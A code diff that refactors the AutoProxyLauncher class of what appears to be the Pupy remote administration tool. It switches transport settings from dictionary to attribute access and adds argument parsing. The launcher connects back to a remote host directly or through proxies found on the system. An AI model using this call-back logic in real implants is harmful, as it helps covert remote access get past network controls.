@@ -158,25 +158,25 @@ class AutoProxyLauncher(BaseLauncher):
         #first we try without any proxy :
         try:
             t=copy.deepcopy(network.conf.transports[self.args.transport])
-            client_args=t['client_kwargs']
-            transport_args=t['client_transport_kwargs']
+            client_args=t.client_kwargs
+            transport_args=t.client_transport_kwargs
             for val in opt_args:
-                if val.lower() in t['client_kwargs']:
+                if val.lower() in t.client_kwargs:
                     client_args[val.lower()]=opt_args[val]
-                elif val.lower() in t['client_transport_kwargs']:
+                elif val.lower() in t.client_transport_kwargs:
                     transport_args[val.lower()]=opt_args[val]
                 else:
                     logging.warning("unknown transport argument : %s"%tab[0])
             logging.info("using client options: %s"%client_args)
             logging.info("using transports options: %s"%transport_args)
             try:
-                client=t['client'](**client_args)
+                client=t.client(**client_args)
             except Exception as e:
                 #at this point we quit if we can't instanciate the client
                 raise SystemExit(e)
             logging.info("connecting to %s:%s using transport %s without any proxy ..."%(self.rhost, self.rport, self.args.transport))
             s=client.connect(self.rhost, self.rport)
-            stream = t['stream'](s, t['client_transport'], transport_args)
+            stream = t.stream(s, t.client_transport, transport_args)
             yield stream
         except StopIteration:
             raise
@@ -187,19 +187,19 @@ class AutoProxyLauncher(BaseLauncher):
         for proxy_type, proxy, proxy_username, proxy_password in get_proxies():
             try:
                 t=copy.deepcopy(network.conf.transports[self.args.transport])
-                client_args=t['client_kwargs']
-                transport_args=t['client_transport_kwargs']
+                client_args=t.client_kwargs
+                transport_args=t.client_transport_kwargs
                 for val in opt_args:
-                    if val.lower() in t['client_transport_kwargs']:
+                    if val.lower() in t.client_transport_kwargs:
                         transport_args[val.lower()]=opt_args[val]
                     else:
                         client_args[val.lower()]=opt_args[val]
-                if t['client'] is PupyTCPClient:
-                    t['client']=PupyProxifiedTCPClient
-                elif t['client'] is PupySSLClient:
-                    t['client']=PupyProxifiedSSLClient
+                if t.client is PupyTCPClient:
+                    t.client=PupyProxifiedTCPClient
+                elif t.client is PupySSLClient:
+                    t.client=PupyProxifiedSSLClient
                 else:
-                    raise SystemExit("proxyfication for client %s is not implemented"%str(t['client']))
+                    raise SystemExit("proxyfication for client %s is not implemented"%str(t.client))
                 client_args["proxy_type"]=proxy_type.upper()
                 proxy_addr, proxy_port=proxy.split(":",1)
                 client_args["proxy_addr"]=proxy_addr
@@ -209,13 +209,18 @@ class AutoProxyLauncher(BaseLauncher):
                 logging.info("using client options: %s"%client_args)
                 logging.info("using transports options: %s"%transport_args)
                 try:
-                    client=t['client'](**client_args)
+                    t.parse_args(transport_args)
+                except Exception as e:
+                    #at this point we quit if we can't instanciate the client
+                    raise SystemExit(e)
+                try:
+                    client=t.client(**client_args)
                 except Exception as e:
                     #at this point we quit if we can't instanciate the client
                     raise SystemExit(e)
                 logging.info("connecting to %s:%s using transport %s and %s proxy %s:%s ..."%(self.rhost, self.rport, self.args.transport, proxy_type, proxy_addr, proxy_port))
                 s=client.connect(self.rhost, self.rport)
-                stream = t['stream'](s, t['client_transport'], transport_args)
+                stream = t.stream(s, t.client_transport, t.client_transport_kwargs)
                 yield stream
             except StopIteration:
                 raise
